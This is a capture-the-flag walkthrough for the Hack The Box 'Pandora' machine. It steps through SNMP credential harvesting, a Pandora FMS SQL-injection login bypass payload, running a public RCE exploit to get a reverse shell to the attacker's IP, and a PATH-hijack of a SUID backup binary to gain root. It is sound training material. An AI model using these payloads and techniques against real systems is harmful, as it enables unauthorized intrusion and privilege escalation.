# [Pandora](https://app.hackthebox.com/machines/pandora)

```bash
nmap -p- --min-rate 10000 10.10.11.136 -Pn
```
![Alt text](img/image.png)

Let's do greater nmap scan for this hosts.

```bash
nmap -sC -sV -A -p22,80 10.10.11.136 
```
![Alt text](img/image-1.png)


Let's scan also UDP scan which we see that SNMP is open.
```bash
nmap -sU -top-ports=100 10.10.11.136 
```

![Alt text](img/image-2.png)

By the way, from grabbing, I see that I need to resolve this ip address into 'panda.htb'.


Here, I use `snmp-mibs-downloader` tool to enumerate SNMP.
With this tool I grab information related to SNMP then read results from here that what kind of information I can get.

```bash
snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 . | tee -a snmp3
```

![Alt text](img/image-3.png)

I used like this, which writes results of SNMP enumeration into 'snmp3' file.

From here, I try to grab information that I can get maybe credentials.

Hola.

![Alt text](img/image-4.png)

I find below credentials, let's try to abuse this.

daniel: HotelBabylon23


Let's join to SSH service via above credentials.

![Alt text](img/image-5.png)



Here I find that Pandora FMS is used, let's try to see this via our attacker machine.
For this, we need to setup Local Port Forwarding (ssh -L option)

```bash
ssh -L localhost:8000:localhost:80 daniel@10.10.11.136
```

If we do this, we can access web application via browsing 'localhost:8000' on our browser.

![Alt text](img/image-6.png)



At the bottom, we can see that version 'v7.0NG.742_FIX_PERL2020' is used, let's try to search publicly known exploit.

I found RCE exploit [CVE-2020-5844](https://github.com/UNICORDev/exploit-CVE-2020-5844.git)


Let's send this exploit into our machine.
```bash
python3 -m http.server --bind 10.10.16.8 8080
```

![Alt text](img/image-8.png)

```bash
wget http://10.10.16.8:8080/exploit-CVE-2020-5844.py
```

![Alt text](img/image-7.png)


First, we need to get PHP session, for this, we need to bypass login form by using this [PoC](https://github.com/l3eol3eo/CVE-2021-32099_SQLi).

```bash
http://localhost:80/pandora_console/include/chart_generator.php?session_id=PayloadHere%27%20union%20select%20%271%27,%272%27,%27id_usuario|s:5:%22admin%22;%27%20--%20a 
```

![Alt text](img/image-9.png)


Yes it worked , we get session id 'gu9ohtjtl3kr1sve6dle129fkf'


```bash
python3 exploit-CVE-2020-5844.py -t 127.0.0.1 80 -p gu9ohtjtl3kr1sve6dle129fkf -s 10.10.16.8 1337

```

![Alt text](img/image-10.png)


We got reverse shell.

![Alt text](img/image-11.png)


Let's make interactive shell.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

![Alt text](img/image-12.png)


user.txt

![Alt text](img/image-13.png)


I just searched for SUID files via below command.
```bash
find / -perm -4000 -ls 2>/dev/null
```

![Alt text](img/image-14.png)


There is interesting one called '/usr/bin/pandora_backup'.

![Alt text](img/image-15.png)


While we want to look at executable's content, we see that `tar` command is used .

![Alt text](img/image-16.png)


First of all, I need to get good and interactive shell (persistent), for this I need to generate public key file.

![Alt text](img/image-18.png)

![Alt text](img/image-17.png)


We got interacteive shell by joining (via private key).

![Alt text](img/image-19.png)

Then, As I know `tar` command is used for `pandora_backup` binary, I need to create malicious `tar` command which give me shell of root. For this , I need to do below steps.

```bash
cd /tmp
echo "/bin/bash" > tar
chmod +x tar
export PATH=/tmp:$PATH
/usr/bin/pandora_backup # run target executable
```

root.txt

![Alt text](img/image-20.png)